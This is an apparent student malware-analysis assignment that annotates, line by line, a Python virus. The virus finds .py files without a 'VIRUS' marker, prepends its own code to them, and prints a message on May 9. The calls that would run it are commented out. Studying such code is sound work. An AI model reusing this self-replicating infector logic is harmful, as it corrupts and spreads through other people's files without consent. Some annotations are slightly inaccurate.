# Script: Ops 301 Class 14 Ops Challenge Solution
# Author: Connie Uribe Chavez
# Date of lates revision: 30 Mar 2023
# Purpose: Malware code analysis
# Reference: ChatGPT was used in this analysis.
################################



#!/usr/bin/python3 #shebang, it tells the operating system which interpreter to use
import os #imports the os module
import datetime #imports the date and time module

SIGNATURE = "VIRUS" #sets a variable called SIGNATURE to the string "VIRUS"

def locate(path): #Defines a function called locate and takes an argument called path
    files_targeted = [] #creates an empty list called files_targeted.
    filelist = os.listdir(path) #method to get a list of all the files in the directory specified by path.
    for fname in filelist: #For loop to iterate through each file in the filelist.
        if os.path.isdir(path+"/"+fname): # if statement: checks whether the file is a directory.
            files_targeted.extend(locate(path+"/"+fname)) #calls the locate function recursively if the file is a directory.
        elif fname[-3:] == ".py": #Else if: checks if the file ends with ".py"
            infected = False #sets the variable infected to false
            for line in open(path+"/"+fname): #opens the file and reads it line by line.
                if SIGNATURE in line: #checks if the line contains the SIGNATURE string.
                    infected = True #sets the variable infected to true (because it has already changed the filename)
                    break #breaks and exits the if statement once the SIGNATURE string is found.
            if infected == False: #checks if the infected variable is still False.
                files_targeted.append(path+"/"+fname) #appends the path and filename to the files_targeted list.
    return files_targeted #returns the files_targeted list.

def infect(files_targeted): #defines a function called infect that takes a files_targeted argument.
    virus = open(os.path.abspath(__file__)) #opens the current file.
    virusstring = "" #creates an empty string called virusstring.
    for i,line in enumerate(virus): #loops over each line in the file.
        if 0 <= i < 39: #checks if the line number is between 0 and 39.
            virusstring += line #appends the line to the virusstring.
    virus.close #closes the file.
    for fname in files_targeted: #iterates over each file in the files_targeted list.
        f = open(fname) #opens the file.
        temp = f.read() #reads the contents of the file into a variable called temp.
        f.close() #closes the file.
        f = open(fname,"w") #opens the file in write mode.
        f.write(virusstring + temp) #writes the virus code to the beginning of the file.
        f.close() #closes the file.

def detonate(): #defines a function called detonate.
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: #checks if the current date is May 9th.
        print("You have been hacked") #prints the string if the date is May 9th.

## files_targeted = locate(os.path.abspath("")) #calls the locate function with the current directory as the argument.
## infect(files_targeted) #calls the infect function with the `files_targeted
## detonate() #calls the detonate function


###
# The script is a virus that searches for Python files in the current directory 
# and its subdirectories, adds the "signature" at the beginning of those files, 
# and prints a "You've been hacked" if the current date is on May 9th.

# This script finds all Python files in the current directory and its subdirectories, 
# potentially causing them to malfunction or behave unexpectedly. 
# The virus may also spread to other computers if the infected files are shared or copied.